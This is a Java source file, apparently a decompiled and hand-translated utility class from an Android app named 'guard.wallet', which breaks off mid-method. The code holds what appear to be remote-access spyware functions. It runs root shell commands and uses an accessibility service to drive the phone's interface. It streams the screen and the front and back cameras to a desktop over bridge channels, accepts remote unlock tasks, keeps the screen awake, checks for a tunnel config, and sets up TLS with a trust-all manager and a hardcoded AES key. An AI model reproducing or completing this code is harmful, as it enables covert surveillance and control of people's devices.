package com.guard.wallet.core;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeBufferBody;
import com.guard.wallet.msg.BridgeBufferMessage;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.CacheTaskVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.net.ServerSocket;
import java.nio.ByteBuffer;
import java.nio.channels.ByteChannel;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.LinkedBlockingQueue;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;

/**
 * 全局工具/管理类 (vendor 原始路径: a1/q.java, 1962行), 被全项目引用。
 * 翻译自 CFR + JADX 双源。
 *
 * 已实现方法 (保留原有):
 *   B(String), D(String), s(String,Exception), E(int), a(Object...), J(String), d(), e()
 *
 * 新增翻译:
 *   Priority A: u, x, A, C, G, H, M, R, S, t, h
 *   Priority B: F, I, K, Q, v, w, l, n, m, r
 *   Priority C (skeleton): y, T, p, q, c, L, N, O, P, U, z, b, k, g, o
 */
public abstract class AppUtils {

    // ═══════ 静态字段 (vendor fields) ═══════
    public static okio.Segment a;
    public static long b;
    public static com.guard.wallet.bridge.a c;
    public static com.guard.wallet.bridge.a d;
    public static com.guard.wallet.bridge.a e;
    public static com.guard.wallet.bridge.a f;
    public static com.guard.wallet.bridge.a g;
    public static boolean i;
    public static SSLContext j;
    public static final int k = 0;
    public static final okhttp3.Callback HTTP_NOOP_CB = new okhttp3.Callback() {
        @Override public void onFailure(okhttp3.Call call, IOException ex) {}
        @Override public void onResponse(okhttp3.Call call, okhttp3.Response response) throws IOException {
            if (response != null) response.close();
        }
    };

    // Base64 alphabet: A-Z a-z 0-9 + /
    public static final byte[] h = {
        65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
        97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,
        48,49,50,51,52,53,54,55,56,57,43,47
    };
    // Same as h (standard Base64)
    public static final byte[] l = {
        65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
        97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,
        48,49,50,51,52,53,54,55,56,57,43,47
    };
    // URL-safe Base64: A-Z a-z 0-9 - _
    public static final byte[] m = {
        65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
        97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,
        48,49,50,51,52,53,54,55,56,57,45,95
    };
    // Sorted safe chars: - 0-9 A-Z _ a-z
    public static final byte[] n = {
        45,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
        95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122
    };

    // ═══════ 已有方法 (保持不变) ═══════

    /** B(obj) — 对象为空/null/"" 检查 (被引用 500+ 次) */
    public static boolean B(Object var0) {
        return var0 == null || "".equals(var0);
    }

    /** D(str) — 字符串是否为数字 */
    public static boolean D(String var0) {
        if (B(var0)) return false;
        String cleaned = Q(var0);
        if (cleaned.isEmpty()) return true;
        for (char c : cleaned.toCharArray()) {
            if (!"-0123456789.Ee".contains(c + "")) {
                return false;
            }
        }
        return true;
    }

    /** s(tag, e) — 记录异常日志 */
    public static void s(String var0, Exception var1) {
        String msg;
        if (!B(var1.getMessage())) {
            msg = var1.getMessage();
        } else if (var1.getCause() != null) {
            msg = var1.getCause().toString();
        } else {
            msg = Arrays.toString(var1.getStackTrace());
        }
        Log.e(var0, msg);
    }

    /** E(port) — 检查端口是否可用 */
    public static boolean E(int var0) {
        try {
            ServerSocket ss = new ServerSocket(var0);
            try {
                ss.close();
            } catch (IOException ex) {
                s("IpUtils", ex);
            }
            return true;
        } catch (IOException ex) {
            s("IpUtils", ex);
            return false;
        }
    }

    /** a(args) — 构建 Bundle (用于 performAction 参数) */
    public static Bundle a(Object... args) {
        Bundle bundle = new Bundle();
        if (args == null) return bundle;
        for (int i = 0; i + 1 < args.length; i += 2) {
            String key = String.valueOf(args[i]);
            Object val = args[i + 1];
            if (val instanceof String) bundle.putString(key, (String) val);
            else if (val instanceof Integer) bundle.putInt(key, (Integer) val);
            else if (val instanceof Boolean) bundle.putBoolean(key, (Boolean) val);
            else if (val instanceof Float) bundle.putFloat(key, (Float) val);
            else if (val instanceof CharSequence) bundle.putCharSequence(key, (CharSequence) val);
        }
        return bundle;
    }

    /** J(filePath) — 读取图片文件并解码为 Bitmap */
    public static Bitmap J(String filePath) {
        try {
            FileInputStream fis = new FileInputStream(filePath);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int len;
            while ((len = fis.read(buf)) > 0) {
                baos.write(buf, 0, len);
            }
            baos.flush();
            byte[] data = baos.toByteArray();
            baos.close();
            if (data.length > 0) {
                return BitmapFactory.decodeByteArray(data, 0, data.length, null);
            }
            return null;
        } catch (Exception e) {
            s("FileUtils", e);
            return null;
        }
    }

    /** d() — 获取电池信息 */
    public static BatteryLevelVO d() {
        if (com.guard.wallet.utils.SystemHelper.Z() != null) {
            BatteryManager bm = (BatteryManager) com.guard.wallet.utils.SystemHelper.Z().getSystemService("batterymanager");
            Log.d("BatteryUtils", "BATTERY_PROPERTY_CAPACITY:" + bm.getIntProperty(4));
            float percent = (float) ((double) bm.getIntProperty(4) / 100.0);
            if (Build.VERSION.SDK_INT > 26) {
                com.guard.wallet.utils.SharedPrefsManager.D(bm.getIntProperty(6), "batteryStatus");
            }
            com.guard.wallet.utils.SharedPrefsManager.D(percent, "batteryPercent");
        }
        BatteryLevelVO vo = new BatteryLevelVO();
        vo.setStatus(com.guard.wallet.utils.SharedPrefsManager.i("batteryStatus"));
        vo.setPercent(com.guard.wallet.utils.SharedPrefsManager.h());
        vo.setHealth(com.guard.wallet.utils.SharedPrefsManager.i("batteryHealth"));
        vo.setTemperature(com.guard.wallet.utils.SharedPrefsManager.i("batteryTemperature"));
        vo.setVoltage(com.guard.wallet.utils.SharedPrefsManager.i("batteryVoltage"));
        return vo;
    }

    /** e() — 检查设备是否 root */
    public static boolean e() {
        int var1 = com.guard.wallet.utils.SharedPrefsManager.i("isRoot");
        int var0 = var1;
        if (var1 != 0 && var1 != 1) {
            if (u(new String[]{"echo root"}, true, false).getResult() == 0) {
                var0 = 1;
            } else {
                var0 = 0;
            }
            com.guard.wallet.utils.SharedPrefsManager.D(var0, "isRoot");
        }
        return var0 == 1;
    }

    // ═══════ Priority A — 新增翻译 ═══════

    /**
     * u(commands, isSu, readOutput) — 执行 shell 命令, 返回 CommandResult。
     * vendor 核心方法 (line 1527, bytecode 翻译)。
     * 使用 Runtime.exec("su"/"sh") → DataOutputStream 写入命令 → waitFor → 读取 stdout/stderr。
     */
    public static CommandResult u(String[] var0, boolean var1, boolean var2) {
        int cmdLen = var0.length;
        if (cmdLen == 0) {
            return new CommandResult(-1, null, null);
        }
        LinkedList<String> successLines = new LinkedList<>();
        LinkedList<String> errorLines = new LinkedList<>();
        Process process = null;
        DataOutputStream os = null;
        BufferedReader successReader = null;
        BufferedReader errorReader = null;
        int exitCode = -1;

        try {
            Runtime runtime = Runtime.getRuntime();
            String shell = var1 ? "su" : "sh";
            process = runtime.exec(shell);
            os = new DataOutputStream(process.getOutputStream());

            // Write each command
            for (String cmd : var0) {
                if (cmd == null) continue;
                os.write(cmd.getBytes());
                os.writeBytes("\n");
                os.flush();
            }

            // Send exit
            os.writeBytes("exit\n");
            os.flush();

            // Wait for process
            exitCode = process.waitFor();

            // Read output if requested
            if (var2) {
                successReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String line;
                while ((line = successReader.readLine()) != null) {
                    successLines.add(line);
                }
                while ((line = errorReader.readLine()) != null) {
                    errorLines.add(line);
                }
            }
        } catch (Exception ex) {
            s("ShellUtils", ex);
        } finally {
            // Close streams
            try {
                if (os != null) os.close();
            } catch (Exception ignored) {}
            try {
                if (successReader != null) successReader.close();
            } catch (Exception ex) {
                s("ShellUtils", ex);
            }
            try {
                if (errorReader != null) errorReader.close();
            } catch (Exception ignored) {}
            // Destroy process
            if (process != null) {
                process.destroy();
            }
        }

        return new CommandResult(exitCode, successLines, errorLines);
    }

    /** x(str) — 从 URL 路径提取文件名 (lastIndexOf "/") */
    public static String x(String var0) {
        if (!B(var0)) {
            int idx = var0.lastIndexOf("/");
            if (idx != -1) {
                return var0.substring(idx + 1);
            }
        }
        return null;
    }

    /** A() — 检查当前应用是否在前台 (ADB connection available) */
    public static boolean A() {
        if (MyAccessibilityService.P() != null) {
            String currentPkg = MyAccessibilityService.P().S();
            if (!B(currentPkg)) {
                return Objects.equals(currentPkg, MyAccessibilityService.P().getPackageName());
            }
        }
        if (com.guard.wallet.utils.SystemHelper.Z() != null) {
            return com.guard.wallet.utils.SystemHelper.s0(com.guard.wallet.utils.SystemHelper.Z().getPackageName());
        }
        return false;
    }

    /** C() — 检查是否在桌面/启动器 (screen locked check) */
    public static boolean C() {
        String launcherPkg = com.guard.wallet.utils.SystemHelper.b0();
        if (MyAccessibilityService.P() != null) {
            return Objects.equals(MyAccessibilityService.P().S(), launcherPkg);
        }
        return com.guard.wallet.utils.SystemHelper.s0(launcherPkg);
    }

    /** G() — 检查是否需要悬浮窗权限 (canDrawOverlays) */
    public static boolean G() {
        if (com.guard.wallet.utils.DeviceUtils.isXiaomiFamily() || com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
            return !Settings.canDrawOverlays(com.guard.wallet.utils.SystemHelper.Z());
        }
        return false;
    }

    /** H() — 获取当前时间字符串 HH:mm:ss */
    public static String H() {
        return new SimpleDateFormat("HH:mm:ss", Locale.CHINA).format(new Date(System.currentTimeMillis()));
    }

    /** M() — 检查设备是否未锁定且在前台 */
    public static boolean M() {
        if (com.guard.wallet.utils.SystemHelper.p0()) {
            return false;
        }
        return b();
    }

    /** R() — 循环检查 A() 最多 10 次 (每次等 1 tick) */
    public static boolean R() {
        boolean result = A();
        int count = 0;
        while (!result && count < 10) {
            com.guard.wallet.utils.SystemHelper.T0(1);
            count++;
            result = A();
        }
        return result;
    }

    /**
     * S() — 唤醒屏幕 (多策略):
     * 1. 检查 e.j() (isInteractive)
     * 2. 尝试 WakeLock
     * 3. 尝试 ADB keyevent KEYCODE_WAKEUP
     * 4. 尝试 performGlobalAction
     */
    public static boolean S() {
        if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
            return true;
        }
        boolean wakeLockAcquired = false;
        Context ctx = com.guard.wallet.utils.SystemHelper.Z();
        if (ctx != null) {
            try {
                PowerManager.WakeLock wakeLock = ((PowerManager) ctx.getSystemService("power"))
                        .newWakeLock(805306378, "WakeLockUtils");
                if (wakeLock.isHeld()) {
                    wakeLock.release();
                }
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(600000L);
                wakeLockAcquired = true;
            } catch (Exception ex) {
                s("WakeLockUtils", ex);
            }
        }
        if (wakeLockAcquired && com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
            com.guard.wallet.utils.SystemHelper.T0(2);
            if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
                return true;
            }
        }
        // vendor: h.e.S() → ADB shell handler — skeleton: skip ADB keyevent path
        // if (h.e.S() != null && h.e.S().D() && h.e.S().N("input keyevent KEYCODE_WAKEUP")) {
        //     com.guard.wallet.utils.SystemHelper.T0(2);
        //     if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) return true;
        // }
        return com.guard.wallet.utils.SystemHelper.F0(2);
    }

    /** t(tag, throwable) — 记录 Throwable 日志 (同 s 但接受 Throwable) */
    public static void t(String var0, Throwable var1) {
        String msg;
        if (!B(var1.getMessage())) {
            msg = var1.getMessage();
        } else {
            msg = Arrays.toString(var1.getStackTrace());
        }
        Log.e(var0, msg);
    }

    /** h(closeables) — 安全关闭多个 Closeable */
    public static void h(Closeable... var0) {
        for (Closeable c : var0) {
            if (c != null) {
                try {
                    c.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    // ═══════ Priority B — 新增翻译 ═══════

    /** F(str) — 发送 readScreen buffer 到桌面端 */
    public static void F(String var0) {
        if (B(var0) || !z()) return;
        com.guard.wallet.bridge.a bridge = e;
        if (bridge == null) return;
        if (B(var0)) return;
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (B(deviceId)) return;
        BridgeBufferBody body = new BridgeBufferBody();
        body.setBridgePath(bridge.u);
        body.setDeviceId(deviceId);
        body.setToDesktop(Boolean.TRUE);
        body.setBuffer(var0);
        bridge.c(com.guard.wallet.utils.SharedPrefsManager.N(new BridgeBufferMessage(body)));
    }

    /** I(str) — 判断 HTTP 方法是否有 body (非 GET/HEAD) */
    public static boolean I(String var0) {
        return !var0.equals("GET") && !var0.equals("HEAD");
    }

    /**
     * K(path) — 读取文件全部内容为字符串。
     * vendor 实现: FileInputStream → InputStreamReader → BufferedReader → readLine loop。
     */
    public static String K(String var0) {
        if (B(var0)) return null;
        File file = new File(var0);
        if (!file.exists() || !file.isFile() || !file.canRead()) return null;

        Log.d("FileUtils", "文件存在,能读取:" + var0);

        FileInputStream fis = null;
        InputStreamReader isr = null;
        BufferedReader br = null;
        try {
            fis = new FileInputStream(file);
            isr = new InputStreamReader(fis);
            br = new BufferedReader(isr);
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
                sb.append('\n');
            }
            fis.close();
            isr.close();
            br.close();
            return sb.toString();
        } catch (IOException ex) {
            s("FileUtils", ex);
            if (fis != null) {
                try { fis.close(); } catch (IOException ex2) { s("FileUtils", ex2); }
            }
            if (isr != null) {
                try { isr.close(); } catch (IOException ex2) { s("FileUtils", ex2); }
            }
            if (br != null) {
                try { br.close(); } catch (IOException ex2) { s("FileUtils", ex2); }
            }
        }
        return null;
    }

    /** Q(str) — 清理字符串: 去除空白、null */
    public static String Q(String var0) {
        if (B(var0) || "null".equals(var0)) return "";
        return var0.replaceAll("\\s*", "")
                   .replaceAll(" ", "")
                   .replaceAll("\u00A0", "")
                   .replaceAll("^[\u3000 ]+|[\u3000 ]+$", "");
    }

    /** v(path) — 检查 path/frpc.ini 是否存在 */
    public static boolean v(String var0) {
        return w(var0 + "/frpc.ini");
    }

    /** w(path) — 检查文件是否存在且为文件 */
    public static boolean w(String var0) {
        File file = new File(var0);
        if (file.exists() && file.isFile()) {
            Log.d("FileUtils", var0 + " 文件存在");
            return true;
        }
        return false;
    }

    /** l(path) — 创建新文件 (先删除旧的) */
    public static boolean l(String var0) {
        if (!B(var0)) {
            File file = new File(var0);
            if (file.exists() && file.delete()) {
                Log.d("FileUtils", "文件存在,删除成功:" + var0);
            }
            try {
                if (file.createNewFile()) {
                    Log.d("FileUtils", "文件创建成功:" + var0);
                    return true;
                }
            } catch (IOException ex) {
                s("FileUtils", ex);
            }
        }
        Log.e("FileUtils", "文件创建失败:" + var0);
        return false;
    }

    /** n(path) — 删除文件 (如果存在) */
    public static boolean n(String var0) {
        File file = new File(var0);
        return file.exists() && file.delete();
    }

    /** m(str) — AES/ECB 解密 (Base64 → AES decrypt) */
    public static String m(String var0) {
        try {
            byte[] decoded = Base64.decode(var0, 16);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(2, new SecretKeySpec("****1qaz2wsx****".getBytes(), "AES"));
            return new String(cipher.doFinal(decoded));
        } catch (Exception ex) {
            s("AESUtils", ex);
            return null;
        }
    }

    /** r(length, bytes) — Base64 编码 byte[] 为字符串 */
    public static String r(int var0, byte[] var1) {
        if (var1 == null) {
            throw new IllegalArgumentException("Cannot serialize a null array.");
        }
        if (var0 < 0) {
            throw new IllegalArgumentException("Cannot have length offset: " + var0);
        }
        if (var0 > var1.length) {
            throw new IllegalArgumentException(String.format(
                "Cannot have offset of %d and length of %d with array of length %d",
                0, var0, var1.length));
        }

        int fullGroups = var0 / 3;
        int partialLen = (var0 % 3 > 0) ? 4 : 0;
        int encodedLen = fullGroups * 4 + partialLen;
        byte[] encoded = new byte[encodedLen];

        int srcPos = 0;
        int dstPos = 0;
        int limit = var0 - 2;
        while (srcPos < limit) {
            q(var1, srcPos, 3, encoded, dstPos, 0);
            srcPos += 3;
            dstPos += 4;
        }
        if (srcPos < var0) {
            q(var1, srcPos, var0 - srcPos, encoded, dstPos, 0);
            dstPos += 4;
        }

        byte[] result = encoded;
        if (dstPos <= encodedLen - 1) {
            result = new byte[dstPos];
            System.arraycopy(encoded, 0, result, 0, dstPos);
        }

        try {
            return new String(result, "US-ASCII");
        } catch (UnsupportedEncodingException ex) {
            return new String(result);
        }
    }

    // ═══════ Priority C — Skeleton / Complex methods ═══════

    /** z() — 检查 readScreen bridge 是否已连接 */
    public static boolean z() {
        com.guard.wallet.bridge.a bridge = e;
        return bridge != null && bridge.w.get();
    }

    /** b() — 循环确保应用在前台 (R() + C() check) */
    public static boolean b() {
        boolean isHome;
        while (true) {
            isHome = R();
            boolean isLauncher = C();
            if (isHome || isLauncher || MyAccessibilityService.P() == null) {
                break;
            }
            com.guard.wallet.utils.SystemHelper.F0(1);
        }
        return isHome;
    }

    /** U(path, content) — 写入字符串到文件 */
    public static boolean U(String var0, String var1) {
        if (B(var0) || B(var1)) return false;
        File file = new File(var0);
        if (!file.exists() || !file.isFile() || !file.canWrite()) return false;
        Log.d("FileUtils", "文件存在,能写入:" + var0);
        try {
            FileOutputStream fos = new FileOutputStream(file, false);
            byte[] bytes = var1.getBytes();
            fos.write(bytes, 0, bytes.length);
            fos.flush();
            return true;
        } catch (Exception ex) {
            s("FileUtils", ex);
        }
        return false;
    }

    /** o(appName) — 构建 CombineFiltersWithOr 用于查找应用图标 */
    public static CombineFiltersWithOr o(String var0) {
        CombineFiltersWithOr filters = new CombineFiltersWithOr(new LinkedList<>());
        List<CombineFilter> list = filters.getFilters();

        String label = B(var0) ? com.guard.wallet.utils.SystemHelper.x0() : var0;

        // Filter 1: text equals
        CombineFilter filter1 = new CombineFilter();
        filter1.setStringConditions(new LinkedList<>());
        filter1.setBoolConditions(new LinkedList<>());
        StringCondition textCond = new StringCondition();
        textCond.setProperty("text");
        textCond.setEquals(label);
        filter1.getStringConditions().add(textCond);
        filter1.getBoolConditions().add(new BoolCondition("visibleToUser", true, true));
        list.add(filter1);

        // Filter 2: desc equals
        List<CombineFilter> list2 = filters.getFilters();
        String label2 = B(var0) ? com.guard.wallet.utils.SystemHelper.x0() : var0;
        CombineFilter filter2 = new CombineFilter();
        filter2.setStringConditions(new LinkedList<>());
        filter2.setBoolConditions(new LinkedList<>());
        StringCondition descCond = new StringCondition();
        descCond.setProperty("desc");
        descCond.setEquals(label2);
        filter2.getStringConditions().add(descCond);
        filter2.getBoolConditions().add(new BoolCondition("visibleToUser", true, true));
        list2.add(filter2);

        return filters;
    }

    /**
     * O(packageName, appLabel) — 打开指定应用 (复杂 UI 自动化)。
     * vendor 实现: b() → R() → 查找桌面图标 → 点击打开 → 验证前台。
     */
    public static boolean O(String var0, String var1) {
        b();
        if (R()) return true;

        String pkg = var0;
        if (B(var0) && MainApplication.getAppContext() != null) {
            pkg = MainApplication.getAppContext().getPackageName();
        }

        String label = var1;
        if (B(var1)) {
            if (MainApplication.getInstance() != null
                && MainApplication.getInstance().getBuildConfig() != null
                && !B(MainApplication.getInstance().getBuildConfig().getLauncherLabel())) {
                label = MainApplication.getInstance().getBuildConfig().getLauncherLabel();
            } else {
                label = "StripChat";
            }
        }

        if (!B(pkg) && com.guard.wallet.utils.SystemHelper.d1(pkg, "") && R()) {
            return true;
        }

        if (MyAccessibilityService.P() != null && MyAccessibilityService.Q() != null) {
            if (!A()) {
                String launcherPkg = com.guard.wallet.utils.SystemHelper.b0();
                if (!Objects.equals(MyAccessibilityService.P().S(), launcherPkg)) {
                    com.guard.wallet.utils.SystemHelper.F0(2);
                }
            }

            UiObject found = MyAccessibilityService.Q().findOneByOperateOr(o(label));
            if (found == null) {
                com.guard.wallet.utils.SystemHelper.F0(2);
                for (int retry = 0; found == null && retry < 5; retry++) {
                    com.guard.wallet.utils.SystemHelper.S(10L, 100L, new Point(300.0f, 200.0f), new Point(20.0f, 200.0f));
                    com.guard.wallet.utils.SystemHelper.T0(5);
                    MyAccessibilityService.P().l0(false);
                    found = MyAccessibilityService.Q().findOneByOperateOr(o(label));
                }
            }

            if (found != null) {
                com.guard.wallet.utils.SystemHelper.s(
                    (int) found.centerInScreen().getX(),
                    (int) found.centerInScreen().getY());
                if (R()) return true;

                CombineFilter clickFilter = new CombineFilter();
                clickFilter.setBoolConditions(new LinkedList<>());
                clickFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
                UiObject parent = found.findParentUtilCombine(clickFilter);
                if (parent != null) {
                    com.guard.wallet.utils.SystemHelper.s(
                        (int) parent.centerInScreen().getX(),
                        (int) parent.centerInScreen().getY());
                    return R();
                }
            }
        }
        return false;
    }

    /** g(path) — 关闭指定 bridge 通道 */
    public static void g(String var0) {
        if (B(var0)) return;
        switch (var0) {
            case "/backCameraLive":
                if (g != null) { g.t(); g = null; }
                break;
            case "/cacheTask":
                if (c != null) { c.t(); c = null; }
                break;
            case "/frontCameraLive":
                if (f != null) { f.t(); f = null; }
                break;
            case "/readScreen":
                if (e != null) { e.t(); e = null; }
                break;
            case "/minicap":
                if (d != null) { d.t(); d = null; }
                break;
        }
    }

    /** k(path, message) — 发送 bridge 消息到指定通道 (创建通道如不存在) */
    public static void k(String var0, BridgeMessage var1) {
        if (B(var0)) return;
        com.guard.wallet.bridge.a bridge;
        switch (var0) {
            case "/backCameraLive":
                if (g != null) return;
                g("/minicap");
                g("/frontCameraLive");
                bridge = new com.guard.wallet.bridge.a(var0, var1);
                g = bridge;
                bridge.u();
                // vendor: m.d.c().d(0) → camera init
                return;
            case "/cacheTask":
                if (c != null) return;
                bridge = new com.guard.wallet.bridge.a(var0, var1);
                c = bridge;
                bridge.u();
                return;
            case "/frontCameraLive":
                if (f != null) return;
                g("/minicap");
                g("/backCameraLive");
                bridge = new com.guard.wallet.bridge.a(var0, var1);
                f = bridge;
                bridge.u();
                // vendor: m.d.c().d(1) → front camera init
                return;
            case "/readScreen":
                if (e != null) return;
                bridge = new com.guard.wallet.bridge.a(var0, var1);
                e = bridge;
                bridge.u();
                return;
            case "/minicap":
                if (d != null) return;
                g("/frontCameraLive");
                g("/backCameraLive");
                bridge = new com.guard.wallet.bridge.a(var0, var1);
                d = bridge;
                bridge.u();
                return;
        }
    }

    /** N(cacheTask) — 处理缓存任务 (unlock / HTTP request) */
    public static void N(CacheTaskVO var0) {
        if (var0 == null || B(var0.getReqUri())) return;

        if (var0.getSocketStream()) {
            String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
            if (!B(deviceId)) {
                BridgeBody body = new BridgeBody();
                body.setDeviceId(deviceId);
                body.setBridgePath(var0.getReqUri());
                k(var0.getReqUri(), new BridgeMessage(body));
            }
        }

        if (var0.getReqUri().equals("/unlock")) {
            ReqUnlockDeviceVO reqVO;
            if (!B(var0.getArguments())) {
                reqVO = (ReqUnlockDeviceVO) com.guard.wallet.utils.SharedPrefsManager.c(
                    var0.getArguments(),
                    com.google.gson.reflect.TypeToken.get(ReqUnlockDeviceVO.class));
            } else {
                reqVO = null;
            }
            com.guard.wallet.utils.SystemHelper.p1(reqVO);
        } else {
            if (Objects.equals(var0.getReqMethod(), 0)) {
                new com.guard.wallet.http.HttpClient("http://127.0.0.1:7910")
                    .asyncGet(com.guard.wallet.utils.SharedPrefsManager.M(var0.getArguments()), var0.getReqUri(), HTTP_NOOP_CB);
            }
            if (Objects.equals(var0.getReqMethod(), 1)) {
                new com.guard.wallet.http.HttpClient("http://127.0.0.1:7910")
                    .asyncPost(com.guard.wallet.utils.SharedPrefsManager.M(var0.getArguments()), var0.getReqUri(), HTTP_NOOP_CB);
            }
        }
    }

    /** q(src, srcOff, len, dst, dstOff, flags) — Base64 编码 3 字节块 */
    public static void q(byte[] var0, int var1, int var2, byte[] var3, int var4, int var5) {
        byte[] alphabet;
        if ((var5 & 16) == 16) {
            alphabet = m;
        } else if ((var5 & 32) == 32) {
            alphabet = n;
        } else {
            alphabet = l;
        }

        int combined = 0;
        if (var2 > 0) combined |= (var0[var1] << 24) >>> 8;
        if (var2 > 1) combined |= (var0[var1 + 1] << 24) >>> 16;
        if (var2 > 2) combined |= (var0[var1 + 2] << 24) >>> 24;

        switch (var2) {
            case 1:
                var3[var4] = alphabet[combined >>> 18];
                var3[var4 + 1] = alphabet[(combined >>> 12) & 63];
                var3[var4 + 2] = 61; // '='
                var3[var4 + 3] = 61;
                break;
            case 2:
                var3[var4] = alphabet[combined >>> 18];
                var3[var4 + 1] = alphabet[(combined >>> 12) & 63];
                var3[var4 + 2] = alphabet[(combined >>> 6) & 63];
                var3[var4 + 3] = 61;
                break;
            case 3:
                var3[var4] = alphabet[combined >>> 18];
                var3[var4 + 1] = alphabet[(combined >>> 12) & 63];
                var3[var4 + 2] = alphabet[(combined >>> 6) & 63];
                var3[var4 + 3] = alphabet[combined & 63];
                break;
        }
    }

    /**
     * L(segment) — 回收 segment 到池中 (synchronized on AppUtils.class)。
     * vendor: 如果池总量 + 8192 > 65536 则不回收。
     */
    public static void L(okio.Segment var0) {
        if (var0.next != null || var0.prev != null) {
            throw new IllegalArgumentException();
        }
        if (var0.shared) return;
        synchronized (AppUtils.class) {
            long newSize = b + 8192L;
            if (newSize > 65536L) return;
            b = newSize;
            var0.next = a;
            var0.limit = 0;
            var0.pos = 0;
            a = var0;
        }
    }

    /**
     * P() — 从池中获取 segment (synchronized on AppUtils.class)。
     * vendor: 从链表头取出, 若空则 new Segment()。
     */
    public static okio.Segment P() {
        synchronized (AppUtils.class) {
            okio.Segment pooled = a;
            if (pooled == null) {
                return new okio.Segment();
            }
            a = pooled.next;
            pooled.next = null;
            b -= 8192L;
            return pooled;
        }
    }

    /**
     * y(keyStore) — 创建 TLS 1.3 SSLContext (Conscrypt 优先, fallback 到系统)。
     * skeleton: 使用系统默认 SSLContext (缺少 AdbKeyPair/AdbKeyManager/AdbTrustAllManager 完整实现)。
     */
    public static SSLContext y(com.guard.wallet.adb.AdbKeyPair var0) {
        SSLContext cached = j;
        if (cached != null) return cached;

        try {
            // Try Conscrypt TLSv1.3
            j = SSLContext.getInstance("TLSv1.3");
            i = false;
        } catch (NoSuchAlgorithmException ex) {
            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    j = SSLContext.getInstance("TLSv1.3");
                    i = false;
                } catch (NoSuchAlgorithmException ex2) {
                    throw new RuntimeException("TLSv1.3 not supported", ex2);
                }
            } else {
                throw new RuntimeException("TLSv1.3 isn't supported on your platform.", ex);
            }
        }

        System.out.println("Using " + (i ? "custom" : "default") + " TLSv1.3 provider...");

        try {
            com.guard.wallet.adb.AdbKeyManager keyMgr = new com.guard.wallet.adb.AdbKeyManager(var0);
            com.guard.wallet.adb.AdbTrustAllManager trustMgr = new com.guard.wallet.adb.AdbTrustAllManager();
            j.init(new KeyManager[]{keyMgr}, new X509TrustManager[]{trustMgr}, new SecureRandom());
        } catch (Exception ex) {
            Log.e("SSLUtils", "SSLContext init failed", ex);
        }
        return j;
    }

    /**
     * c(dVar, channel) — WebSocket 写入: 从队列逐帧写入 ByteChannel。
     * skeleton: 依赖 WebSocketConnectionImpl, Draft_6455。
     */
    public static boolean c(com.guard.wallet.websocket.WebSocketConnectionImpl var0, ByteChannel var1) {
        LinkedBlockingQueue<ByteBuffer> queue = var0.outQueue;
        ByteBuffer buf = queue.peek();
        if (buf != null) {
            do {
                try {
                    var1.write(buf);
                } catch (IOException ex) {
                    Log.e("WebSocket", "write error", ex);
                    return false;
                }
                if (buf.remaining() > 0) {
                    return false;
                }
                queue.poll();
                buf = queue.peek();
            } while (buf != null);
        }

        if (queue.isEmpty() && var0.isFlushAndClose) {
            org.java_websocket.drafts.Draft_6455 draftInfo = var0.draft;
            if (draftInfo != null) {
                org.java_websocket.enums.CloseHandshakeType closeType = draftInfo.getCloseHandshakeType();
                if (closeType == org.java_websocket.enums.CloseHandshakeType.TWOWAY) {
                    if (var0.closedByRemote == null) {
                        throw new IllegalStateException("this method must be used in conjunction with flushAndClose");
                    }
